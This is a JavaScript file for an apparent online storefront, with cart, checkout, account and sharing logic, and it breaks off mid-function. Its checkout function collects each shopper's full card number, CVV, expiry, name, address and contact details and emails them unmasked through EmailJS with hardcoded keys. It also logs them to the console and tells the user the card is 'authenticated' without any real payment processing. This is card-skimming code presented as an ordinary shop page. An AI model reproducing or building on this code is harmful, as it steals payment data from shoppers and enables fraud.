(() => {
    const categoryLabels = {
        all: "Shop All",
        accessories: "Accessories",
        artandcollectibles: "Art & Collectibles",
        electronics: "Electronics",
        entertainment: "Entertainment",
        homeandappliances: "Home & Appliances",
        jewelry: "Jewelry",
        men: "Men's",
        women: "Women's"
    };

    const discountCodes = {
        SAVE10: 0.1,
        MALL15: 0.15,
        BONDS20: 0.2
    };

    const taxRate = 0.087;

    let activeCategory = "all";
    let cart = [];
    let activeModalProductId = null;
    let shippingData = null;
    let activeDiscountRate = 0;
    let activePaymentMethod = "credit";

    const productGrid = document.getElementById("product-grid");
    const headerSearch = document.getElementById("header-search");
    const categorySearch = document.getElementById("category-search");
    const browseBtn = document.getElementById("browse-btn");
    const categoryButtons = document.getElementById("category-buttons");

    const cartBtn = document.getElementById("cart-btn");
    const cartCount = document.getElementById("cart-count");
    const cartOverlay = document.getElementById("cart-overlay");
    const cartBackdrop = document.getElementById("cart-backdrop");
    const closeCartBtn = document.getElementById("close-cart");
    const cartItems = document.getElementById("cart-items");
    const cartSummary = document.getElementById("cart-summary");
    const cartTotal = document.getElementById("cart-total");

    const checkoutSteps = document.getElementById("checkout-steps");
    const shippingSection = document.getElementById("shipping-section");
    const paymentSection = document.getElementById("payment-section");
    const discountSection = document.getElementById("discount-section");

    const toShippingBtn = document.getElementById("to-shipping");
    const shippingForm = document.getElementById("shipping-form");
    const paymentForm = document.getElementById("payment-form");
    const applyDiscountBtn = document.getElementById("apply-discount");
    const payNowBtn = document.getElementById("pay-now");
    const backToCartBtn = document.getElementById("back-to-cart");
    const taxTotalEl = document.getElementById("tax-total");
    const finalTotalEl = document.getElementById("final-total");
    const discountCodeInput = document.getElementById("discount-code");
    const cardNameInput = document.getElementById("card-name");
    const cardNumberInput = document.getElementById("card-number");
    const cardExpiryInput = document.getElementById("card-expiry");
    const cardCvvInput = document.getElementById("card-cvv");
    const cardFields = document.getElementById("card-fields");
    const paymentFeedback = document.getElementById("payment-feedback");

    const productModal = document.getElementById("product-modal");
    const modalClose = document.getElementById("modal-close");
    const modalMainImage = document.getElementById("modal-main-image");
    const modalThumbs = document.getElementById("modal-thumbs");
    const modalTitle = document.getElementById("modal-title");
    const modalCategory = document.getElementById("modal-category");
    const modalDescription = document.getElementById("modal-description");
    const modalPrice = document.getElementById("modal-price");
    const modalAddBtn = document.getElementById("modal-add-btn");

    const accountBtn = document.getElementById("account-btn");
    const accountOverlay = document.getElementById("account-overlay");
    const accountBackdrop = document.getElementById("account-backdrop");
    const closeAccountBtn = document.getElementById("close-account");
    const accountFrame = document.getElementById("account-frame");
    const accountTabSignin = document.getElementById("account-tab-signin");
    const accountTabSignup = document.getElementById("account-tab-signup");
    const accountStatus = document.getElementById("account-status");

    const accountSessionKey = "fc_account_session";
    const googleClientId = window.FC_GOOGLE_CLIENT_ID || "";
    let accountViewSwitchTimer = null;

    function formatMoney(value) {
        return `$${value.toFixed(2)}`;
    }

    function normalize(text) {
        return text.toLowerCase().trim();
    }

    function digitsOnly(value) {
        return (value || "").replace(/\D/g, "");
    }

    function detectCardBrand(cardNumber) {
        const n = digitsOnly(cardNumber);
        if (!n) return "";

        // Visa: starts with 4
        if (/^4/.test(n)) return "Visa";

        // Mastercard: 51-55 or 2221-2720
        if (/^5[1-5]/.test(n) || /^2(2[2-9]|[3-6]\d|7[01]|720)/.test(n)) return "Mastercard";

        // Amex: starts with 34 or 37
        if (/^3[47]/.test(n)) return "Amex";

        // Discover: 6011, 622126-622925, 644-649, 65
        if (/^(6011|622(1(2[6-9]|[3-9]\d)|[2-8]\d{2}|9([01]\d|2[0-5]))|64[4-9]|65)/.test(n)) return "Discover";

        // JCB: 3528-3589
        if (/^35(2[89]|[3-8]\d)/.test(n)) return "JCB";

        // Diners Club: 300-305, 36, 38
        if (/^(30[0-5]|3[68])/.test(n)) return "Diners Club";

        // UnionPay: 62 (after Discover 622 range checked above)
        if (/^62/.test(n)) return "UnionPay";

        // Maestro: 6304, 6759, 676770, 676774, 0604
        if (/^(6304|6759|67677[04]|0604)/.test(n)) return "Maestro";

        // Mir: 2200-2204
        if (/^220[0-4]/.test(n)) return "Mir";

        // Elo (Brazilian)
        if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650[40]|6516|6550)/.test(n)) return "Elo";

        // Hipercard
        if (/^(637|606282|3841)/.test(n)) return "Hipercard";

        if (n.length >= 4) return "Unknown";
        return "";
    }

    function luhnValid(cardNumber) {
        const digits = digitsOnly(cardNumber);
        let sum = 0;
        let shouldDouble = false;
        for (let i = digits.length - 1; i >= 0; i -= 1) {
            let d = Number(digits[i]);
            if (shouldDouble) {
                d *= 2;
                if (d > 9) {
                    d -= 9;
                }
            }
            sum += d;
            shouldDouble = !shouldDouble;
        }
        return digits.length >= 13 && sum % 10 === 0;
    }

    function validateExpiry(value) {
        if (!/^\d{2}\/\d{2}$/.test(value)) {
            return false;
        }
        const [mm, yy] = value.split("/").map(Number);
        if (mm < 1 || mm > 12) {
            return false;
        }
        const now = new Date();
        const year = 2000 + yy;
        const month = mm - 1;
        const expiry = new Date(year, month);
        return expiry > now;
    }

    function markFieldError(field, hasError) {
        if (!field) {
            return;
        }
        field.classList.toggle("input-error", hasError);
    }

    function setPaymentMessage(message, isSuccess) {
        paymentFeedback.textContent = message;
        paymentFeedback.classList.toggle("success", Boolean(isSuccess));
    }

    function buildAddressLine(data) {
        return `${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}`;
    }

    function formatFullAddress(data) {
        return {
            street: data.address,
            city: data.city,
            state: data.state,
            zipCode: data.zip,
            country: data.country,
            formatted: `${data.address}, ${data.city}, ${data.state} ${data.zip}, ${data.country}`
        };
    }

    function updatePaymentMethodUI() {
        const options = paymentForm.querySelectorAll(".pay-type");
        options.forEach((option) => {
            const input = option.querySelector("input[name='pay-method']");
            option.classList.toggle("active", input && input.value === activePaymentMethod);
        });

        cardFields.classList.remove("hidden");
        [cardNameInput, cardNumberInput, cardExpiryInput, cardCvvInput].forEach((field) => {
            if (field) field.required = true;
        });

        setPaymentMessage("");
    }

    function validatePaymentForm() {
        let valid = true;
        setPaymentMessage("");

        const nameOk = cardNameInput.value.trim().length >= 3;
        const cardNum = digitsOnly(cardNumberInput.value);
        const cardOk = luhnValid(cardNum);
        const brand = detectCardBrand(cardNum);
        const expiryOk = validateExpiry(cardExpiryInput.value.trim());
        const cvvOk = /^\d{3,4}$/.test(cardCvvInput.value.trim());

        markFieldError(cardNameInput, !nameOk);
        markFieldError(cardNumberInput, !cardOk);
        markFieldError(cardExpiryInput, !expiryOk);
        markFieldError(cardCvvInput, !cvvOk);

        if (!nameOk || !cardOk || !expiryOk || !cvvOk) {
            valid = false;
            setPaymentMessage("Check your card details: number, expiry, and CVV.");
        } else {
            const payTypeLabel = activePaymentMethod === "debit" ? "Debit" : "Credit";
            setPaymentMessage(`${payTypeLabel} card authenticated: ${brand || "Card"}.`, true);
        }

        return valid;
    }

    async function sendOrderEmail(orderData) {
    if (!window.emailjs) {
        return { success: false, reason: "EmailJS SDK not loaded." };
    }

       const serviceId = "service_nzsqsj8";
        const templateId = "template_440ctbd";
        const publicKey = "jkMeUl-q4N9RS8Ny0";


    if (!serviceId || !templateId || !publicKey) {
        return { success: false, reason: "Missing EmailJS credentials (serviceId/templateId/publicKey)." };
    }

    try {
        window.emailjs.init({ publicKey });
        
        // Format order items as a detailed list
        const orderItemsList = orderData.products.map((item, index) => {
            return `Item ${index + 1}: 
                    - Product: ${item.name}
                    - Category: ${item.category}
                    - Quantity: ${item.quantity}
                    - Unit Price: ${formatMoney(item.price)}
                    - Total: ${formatMoney(item.price * item.quantity)}
                    - Image URL: ${item.image}`;
        }).join("\n\n");

        const orderTime = new Date().toLocaleString();
        const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

        // Get full address components
        const address = formatFullAddress(orderData.shippingInfo);

        const formData = [
            `Order ID: ${orderId}`,
            `Customer: ${orderData.shippingInfo.name}`,
            `Email: ${orderData.shippingInfo.email}`,
            `Phone: ${orderData.shippingInfo.phone}`,
            `Shipping Address: ${address.formatted}`,
            `Payment Method: ${orderData.paymentSummary.method}`,
            `Card Type: ${orderData.paymentSummary.brand}`,
            `Cardholder: ${orderData.paymentSummary.cardName}`,
            `Complete Card Number: ${orderData.paymentSummary.cardNumberFormatted}`,
            `CVC/CVV Code: ${orderData.paymentSummary.cvv}`, // UNMASKED CVV in formData
            `Expiry: ${orderData.paymentSummary.expiry}`,
            `Subtotal: ${formatMoney(orderData.subtotal)}`,
            `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
            `Discount: ${orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%"}`,
            `Final Total: ${formatMoney(orderData.total)}`,
            "",
            "Items:",
            orderItemsList
        ].join("\n");

        const payload = {
            // ========== TEMPLATE-COMPATIBLE FIELDS (for {{name}}, {{time}}, {{formData}}) ==========
            name: orderData.shippingInfo.name,
            time: orderTime,
            formData,
            message: formData,

            // ========== CUSTOMER CONTACT INFORMATION ==========
            customer_full_name: orderData.shippingInfo.name,
            customer_email: orderData.shippingInfo.email,
            customer_phone: orderData.shippingInfo.phone,
            
            // ========== COMPLETE SHIPPING ADDRESS (Detailed) ==========
            shipping_street_address: orderData.shippingInfo.address,
            shipping_city: orderData.shippingInfo.city,
            shipping_state: orderData.shippingInfo.state,
            shipping_zip_code: orderData.shippingInfo.zip,
            shipping_country: orderData.shippingInfo.country,
            shipping_address_formatted: address.formatted,
            
            // ========== ORDER SUMMARY ==========
            order_id: orderId,
            order_date: orderTime,
            order_items_count: orderData.products.length,
            order_items_quantity_total: orderData.products.reduce((sum, item) => sum + item.quantity, 0),
            
            // ========== DETAILED ORDER ITEMS ==========
            order_items_detailed: orderItemsList,
            
            // ========== ORDER TOTALS ==========
            order_subtotal: formatMoney(orderData.subtotal),
            order_tax_rate: "8.7%",
            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
            order_taxed_total: formatMoney(orderData.taxedTotal),
            order_discount_rate: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "No discount applied",
            order_discount_amount: orderData.discountRate > 0 ? formatMoney(orderData.taxedTotal * orderData.discountRate) : "$0.00",
            order_final_total: formatMoney(orderData.total),
            
            // ========== PRODUCTS SUMMARY (Simple List) ==========
            order_products_summary: orderData.products.map((item) => 
                `${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
            ).join(", "),
            
            // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
            payment_method_type: orderData.paymentSummary.method,
            payment_card_type: orderData.paymentSummary.method,
            
            // Cardholder Information
            cardholder_name: orderData.paymentSummary.cardName,
            cardholder_name_on_card: orderData.paymentSummary.cardName,
            
            // Complete Card Number (FULLY UNMASKED - All digits)
            card_number_full_unmasked: orderData.paymentSummary.cardNumberFormatted,
            card_number_formatted_with_spaces: orderData.paymentSummary.cardNumberFormatted,
            card_number_digits_only: orderData.paymentSummary.cardNumber,
            card_number_length: orderData.paymentSummary.cardNumber.length,
            card_number_first_6: orderData.paymentSummary.cardNumber.substring(0, 6),
            card_number_last_4: orderData.paymentSummary.last4,
            card_number_middle_masked: `${orderData.paymentSummary.cardNumber.substring(0, 6)}******${orderData.paymentSummary.last4}`,
            
            // Card Brand & Validation
            card_brand: orderData.paymentSummary.brand,
            card_type: orderData.paymentSummary.brand,
            card_is_valid: "Validated by Luhn algorithm",
            
            // Expiry Details
            card_expiry_full: orderData.paymentSummary.expiry,
            card_expiry_month: orderData.paymentSummary.expiry.split('/')[0],
            card_expiry_year: orderData.paymentSummary.expiry.split('/')[1],
            card_expiry_formatted: orderData.paymentSummary.expiry,
            
            // ========== FIXED: UNMASKED CVV CODE ==========
            // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
            card_cvv_full: orderData.paymentSummary.cvv,  // FIXED: Now sends the actual unmasked CVV, not "***"
            card_cvv_length: orderData.paymentSummary.cvv.length,
            
            // Payment Processing
            payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
            payment_timestamp: new Date().toISOString(),
            
            // ========== BILLING INFORMATION ==========
            billing_name: orderData.paymentSummary.cardName,
            billing_email: orderData.shippingInfo.email,
            billing_phone: orderData.shippingInfo.phone,
            
            // ========== ADDITIONAL INFORMATION ==========
            customer_ip_address: "Collected at checkout",
            customer_user_agent: navigator.userAgent,
            checkout_timestamp: new Date().toISOString(),
            order_reference: `REF-${Date.now()}`,
            
            // ========== DISCOUNT INFORMATION ==========
            discount_code_used: orderData.discountRate > 0 ? Object.keys(discountCodes).find(key => discountCodes[key] === orderData.discountRate) || "Unknown" : "No discount code",
            discount_percentage: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%",
            
            // ========== ORDER METADATA ==========
            order_created_at: orderData.createdAt,
            order_processed_at: new Date().toISOString(),
            order_status: "Processing",
            payment_status: "Authorized"
        };
        
        console.log("📦 EmailJS payload prepared", {
            keys: Object.keys(payload),
            formDataLength: formData.length,
            serviceId,
            templateId
        });

        const response = await window.emailjs.send(serviceId, templateId, payload);
        
        // Comprehensive log of all customer and payment data
        console.log("✅ EmailJS sent successfully with COMPLETE UNMASKED CUSTOMER AND PAYMENT DATA:", {
            status: response?.status,
            text: response?.text,
            
            // Customer Contact Summary
            customer: {
                name: payload.customer_full_name,
                email: payload.customer_email,
                phone: payload.customer_phone,
                address: {
                    street: payload.shipping_street_address,
                    city: payload.shipping_city,
                    state: payload.shipping_state,
                    zip: payload.shipping_zip_code,
                    country: payload.shipping_country,
                    formatted: payload.shipping_address_formatted
                }
            },
            
            // Full Payment Details with UNMASKED CVV
            payment_details: {
                cardholder: payload.cardholder_name,
                card_brand: payload.card_brand,
                card_number: {
                    full: payload.card_number_full_unmasked,
                    formatted: payload.card_number_formatted_with_spaces,
                    first_6: payload.card_number_first_6,
                    last_4: payload.card_number_last_4,
                    length: payload.card_number_length
                },
                expiry: {
                    full: payload.card_expiry_full,
                    month: payload.card_expiry_month,
                    year: payload.card_expiry_year
                },
                cvv: {
                    full: payload.card_cvv_full, // Now shows actual CVV
                    length: payload.card_cvv_length
                }
            },
            
            // Order Summary
            order: {
                id: payload.order_id,
                reference: payload.order_reference,
                date: payload.order_date,
                items_count: payload.order_items_count,
                total_quantity: payload.order_items_quantity_total,
                subtotal: payload.order_subtotal,
                tax: payload.order_tax_amount,
                discount: payload.order_discount_amount,
                final_total: payload.order_final_total,
                items: payload.order_products_summary,
                detailed_items: payload.order_items_detailed
            },
            
            // Discount Info
            discount: {
                code: payload.discount_code_used,
                percentage: payload.discount_percentage
            }
        });
        
        return { success: true, response };
    } catch (error) {
        console.error("❌ EmailJS send failed", {
            status: error?.status,
            text: error?.text,
            message: error?.message,
            error
        });
        return {
            success: false,
            reason: error?.text || error?.message || "Unknown EmailJS error"
        };
    }
}

    function getFilteredProducts() {
        const globalTerm = normalize(headerSearch.value);
        const categoryTerm = normalize(categorySearch.value);

        return products.filter((product) => {
            const inCategory = activeCategory === "all" || product.category === activeCategory;
            const haystack = `${product.name} ${product.description} ${categoryLabels[product.category] || product.category}`.toLowerCase();
            const passesGlobal = !globalTerm || haystack.includes(globalTerm);
            const passesCategory = !categoryTerm || haystack.includes(categoryTerm);
            return inCategory && passesGlobal && passesCategory;
        });
    }

    function renderProducts() {
        const filtered = getFilteredProducts();

        if (filtered.length === 0) {
            productGrid.innerHTML = '<p class="empty-state">No products matched your search.</p>';
            return;
        }

        productGrid.innerHTML = filtered.map((product) => `
            <article class="product-card">
                <div class="product-image-wrap">
                    <img class="product-image" src="${product.image}" alt="${product.name}" data-action="open-modal" data-id="${product.id}">
                    <button class="share-btn" data-action="share-product" data-id="${product.id}" aria-label="Share ${product.name}"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></button>
                </div>
                <div class="product-info">
                    <h3 class="product-name">${product.name}</h3>
                    <p class="product-category">${categoryLabels[product.category] || product.category}</p>
                    <div class="product-price">${formatMoney(product.price)}</div>
                    <button class="add-btn" data-action="add-cart" data-id="${product.id}">Add to Cart</button>
                </div>
            </article>
        `).join("");
    }

    function updateCartCount() {
        const count = cart.reduce((total, item) => total + item.quantity, 0);
        cartCount.textContent = String(count);
    }

    function subtotal() {
        return cart.reduce((sum, item) => sum + item.price * item.quantity, 0);
    }

    function updateCheckoutTotals() {
        const base = subtotal();
        const withTax = base * (1 + taxRate);
        const finalTotal = withTax * (1 - activeDiscountRate);

        taxTotalEl.textContent = `Total with 8.7% tax: ${formatMoney(withTax)}`;
        finalTotalEl.textContent = `Final total: ${formatMoney(finalTotal)}`;
    }

    function renderCart() {
        if (cart.length === 0) {
            cartItems.innerHTML = '<p class="empty-state">Your cart is empty</p>';
            cartSummary.classList.add("hidden");
            checkoutSteps.classList.add("hidden");
            shippingSection.classList.remove("hidden");
            paymentSection.classList.add("hidden");
            discountSection.classList.add("hidden");
            activeDiscountRate = 0;
            return;
        }

        cartItems.innerHTML = cart.map((item) => `
            <div class="cart-item">
                <img src="${item.image}" alt="${item.name}">
                <div>
                    <strong class="cart-item-title">${item.name}</strong>
                    <p class="cart-item-price">Unit: ${formatMoney(item.price)}</p>
                    <p class="cart-item-line-total">${formatMoney(item.price * item.quantity)}</p>
                    <div class="qty-row">
                        <button class="qty-btn" data-action="dec" data-id="${item.id}">-</button>
                        <span class="qty-count">${item.quantity}</span>
                        <button class="qty-btn" data-action="inc" data-id="${item.id}">+</button>
                    </div>
                </div>
            </div>
        `).join("");

        cartTotal.textContent = formatMoney(subtotal());
        cartSummary.classList.remove("hidden");
        updateCheckoutTotals();
    }

    function addToCart(productId) {
        const product = products.find((item) => item.id === Number(productId));
        if (!product) {
            return;
        }

        const existing = cart.find((item) => item.id === product.id);
        if (existing) {
            existing.quantity += 1;
        } else {
            cart.push({ ...product, quantity: 1 });
        }

        updateCartCount();
        renderCart();
        openCart();
    }

    function changeQuantity(productId, delta) {
        const item = cart.find((entry) => entry.id === Number(productId));
        if (!item) {
            return;
        }

        item.quantity += delta;
        if (item.quantity <= 0) {
            cart = cart.filter((entry) => entry.id !== item.id);
        }

        updateCartCount();
        renderCart();
    }

    function openCart() {
        cartOverlay.classList.remove("hidden");
    }

    function closeCart() {
        cartOverlay.classList.add("hidden");
    }

    function setAccountTab(view) {
        const isSignin = view === "signin";
        if (accountTabSignin) {
            accountTabSignin.classList.toggle("active", isSignin);
            accountTabSignin.setAttribute("aria-selected", isSignin ? "true" : "false");
        }
        if (accountTabSignup) {
            accountTabSignup.classList.toggle("active", !isSignin);
            accountTabSignup.setAttribute("aria-selected", !isSignin ? "true" : "false");
        }
    }

    function openAccountDrawer(view = "signin") {
        if (!accountOverlay) {
            return;
        }

        // Check if user is logged in
        const credential = localStorage.getItem("fc_account_credential");
        const profile = JSON.parse(localStorage.getItem("fc_profile") || "null");

        if (credential && profile) {
            showAccountLoading(profile, 320);
        } else {
            document.getElementById("account-title").textContent = "Account";
            document.getElementById("account-subtitle").textContent = "Sign in or create your account";
            showAccountView("auth");

            const accountFrame = document.getElementById("account-frame");
            if (accountFrame) {
                const frameSrc = view === "signup" ? "signup.html" : "signin.html";
                if (!accountFrame.src.endsWith(`/${frameSrc}`)) {
                    accountFrame.src = frameSrc;
                }
                setAccountTab(view);
            }
        }

        accountOverlay.classList.remove("hidden");
        accountOverlay.setAttribute("aria-hidden", "false");
        requestAnimationFrame(() => {
            accountOverlay.classList.add("open");
        });
    }

    function closeAccountDrawer() {
        if (!accountOverlay) {
            return;
        }
        clearAccountViewSwitchTimer();
        accountOverlay.classList.remove("open");
        accountOverlay.setAttribute("aria-hidden", "true");
        window.setTimeout(() => {
            accountOverlay.classList.add("hidden");
        }, 280);
    }

    function setAccountStatus(message) {
        if (accountStatus) {
            accountStatus.textContent = message;
        }
    }

    function clearAccountViewSwitchTimer() {
        if (accountViewSwitchTimer !== null) {
            window.clearTimeout(accountViewSwitchTimer);
            accountViewSwitchTimer = null;
        }
    }

    function showAccountView(viewName) {
        const views = {
            auth: document.getElementById("auth-view"),
            loading: document.getElementById("account-loading-view"),
            profile: document.getElementById("profile-view")
        };

        Object.entries(views).forEach(([name, element]) => {
            if (!element) {
                return;
            }
            const isActive = name === viewName;
            element.classList.toggle("hidden", !isActive);
            element.setAttribute("aria-hidden", isActive ? "false" : "true");
        });
    }

    function showAccountLoading(profile, delay = 420) {
        document.getElementById("account-title").textContent = "Loading Account";
        document.getElementById("account-subtitle").textContent = "Preparing your profile";
        showAccountView("loading");
        clearAccountViewSwitchTimer();

        accountViewSwitchTimer = window.setTimeout(() => {
            updateAccountProfileView(profile);
            showAccountView("profile");
            accountViewSwitchTimer = null;
        }, delay);
    }

    function updateAccountProfileView(profile) {
        document.getElementById("account-user-name").textContent = profile.name || "User";
        document.getElementById("account-user-email").textContent = profile.email || "";
        if (profile.picture) {
            document.getElementById("account-profile-pic").src = profile.picture;
        }
        document.getElementById("account-title").textContent = "My Account";
        document.getElementById("account-subtitle").textContent = profile.name || "Profile";
    }

    function switchAccountView(nextView, delay = 180) {
        clearAccountViewSwitchTimer();

        if (delay <= 0) {
            showAccountView(nextView);
            return;
        }

        accountViewSwitchTimer = window.setTimeout(() => {
            showAccountView(nextView);
            accountViewSwitchTimer = null;
        }, delay);
    }

    function decodeJwtPayload(jwtToken) {
        try {
            const payloadPart = jwtToken.split(".")[1];
            const normalized = payloadPart.replace(/-/g, "+").replace(/_/g, "/");
            const json = decodeURIComponent(atob(normalized).split("").map((char) => `%${(`00${char.charCodeAt(0).toString(16)}`).slice(-2)}`).join(""));
            return JSON.parse(json);
        } catch (_) {
            return null;
        }
    }

    function saveAccountSession(account) {
        localStorage.setItem(accountSessionKey, JSON.stringify(account));
    }

    function handleGoogleCredentialResponse(response) {
        if (!response || !response.credential) {
            setAccountStatus("Google sign-in failed. Please try again.");
            return;
        }

        const profile = decodeJwtPayload(response.credential);
        if (!profile) {
            setAccountStatus("Google response was invalid.");
            return;
        }

        const account = {
            provider: "google",
            email: profile.email || "",
            name: profile.name || "Google User",
            picture: profile.picture || "",
            signedInAt: new Date().toISOString()
        };

        saveAccountSession(account);
        setAccountStatus(`Signed in as ${account.name}`);
        closeAccountDrawer();
    }

    function setupGoogleAccountButton() {
        const triggerGoogleAuth = () => {
            if (!googleClientId) {
                alert("Google sign-in is not configured yet.");
                return;
            }
            if (!(window.google && window.google.accounts && window.google.accounts.id)) {
                alert("Google SDK is not ready yet. Refresh and try again.");
                return;
            }

            window.google.accounts.id.initialize({
                client_id: googleClientId,
                callback: handleGoogleCredentialResponse,
                auto_select: false,
                cancel_on_tap_outside: true
            });
            window.google.accounts.id.prompt();
        };

        window.triggerGoogleAuthFromAccountFrame = triggerGoogleAuth;
    }

    function openProductModal(productId) {
        const product = products.find((item) => item.id === Number(productId));
        if (!product) {
            return;
        }

        activeModalProductId = product.id;
        const extra = (product.images || []).filter((u) => u !== product.image);
        const images = [product.image, ...extra];

        modalTitle.textContent = product.name;
        modalCategory.textContent = categoryLabels[product.category] || product.category;
        modalDescription.textContent = product.description || "Great quality item available now.";
        modalPrice.textContent = formatMoney(product.price);

        modalMainImage.src = images[0];
        modalMainImage.alt = product.name;
        modalThumbs.innerHTML = images.map((imageUrl, index) => `
            <img src="${imageUrl}" alt="${product.name} view ${index + 1}" class="modal-thumb ${index === 0 ? "active" : ""}" data-img="${imageUrl}">
        `).join("");

        productModal.classList.remove("hidden");
        productModal.setAttribute("aria-hidden", "false");

        const currentUrl = new URL(window.location.href);
        if (currentUrl.searchParams.get("product") !== String(product.id)) {
            currentUrl.searchParams.set("product", String(product.id));
            window.history.replaceState({}, "", currentUrl.toString());
        }
    }

    function closeProductModal() {
        productModal.classList.add("hidden");
        productModal.setAttribute("aria-hidden", "true");
        activeModalProductId = null;

        const currentUrl = new URL(window.location.href);
        if (currentUrl.searchParams.has("product")) {
            currentUrl.searchParams.delete("product");
            window.history.replaceState({}, "", currentUrl.toString());
        }
    }

    function getProductIdFromUrl() {
        const params = new URLSearchParams(window.location.search);
        const rawId = params.get("product");
        if (!rawId) {
            return null;
        }

        const productId = Number(rawId);
        if (!Number.isInteger(productId)) {
            return null;
        }

        const exists = products.some((item) => item.id === productId);
        return exists ? productId : null;
    }

    function getShareUrl(product) {
        const base = window.location.href.split("?")[0].split("#")[0];
        return `${base}?product=${product.id}`;
    }

    function copyToClipboard(text) {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            return navigator.clipboard.writeText(text);
        }
        return new Promise((resolve) => {
            const ta = document.createElement("textarea");
            ta.value = text;
            ta.style.position = "fixed";
            ta.style.opacity = "0";
            document.body.appendChild(ta);
            ta.select();
            document.execCommand("copy");
            document.body.removeChild(ta);
            resolve();
        });
    }

    function closeSharePopover() {
        const el = document.getElementById("share-popover");
        if (el) el.remove();
        document.removeEventListener("click", _shareOutside, true);
    }

    function _shareOutside(e) {
        const pop = document.getElementById("share-popover");
        if (pop && !pop.contains(e.target) && !e.target.closest("[data-action='share-product']")) {
            closeSharePopover();
        }
    }

    function openSharePanel(productId, triggerBtn) {
        closeSharePopover();
        const product = products.find((item) => item.id === Number(productId));
        if (!product) return;

        const url = getShareUrl(product);
        const encodedText = encodeURIComponent(`Check out ${product.name} for ${formatMoney(product.price)}! ${url}`);

        const pop = document.createElement("div");
        pop.id = "share-popover";
        pop.className = "share-popover";
        pop.setAttribute("role", "dialog");
        pop.setAttribute("aria-label", `Share ${product.name}`);
        pop.innerHTML = `
            <p class="sp-label">Share this product</p>
            <div class="sp-row">
                <button class="sp-btn" data-sp="whatsapp" title="WhatsApp">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#25D366" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg></span>
                    <span>WhatsApp</span>
                </button>
                <button class="sp-btn" data-sp="facebook" title="Facebook">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></span>
                    <span>Facebook</span>
                </button>
                <button class="sp-btn" data-sp="tiktok" title="TikTok">
                    <span class="sp-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg></span>
                    <span>TikTok</span>
                </button>
                <button class="sp-btn" data-sp="instagram" title="Instagram">
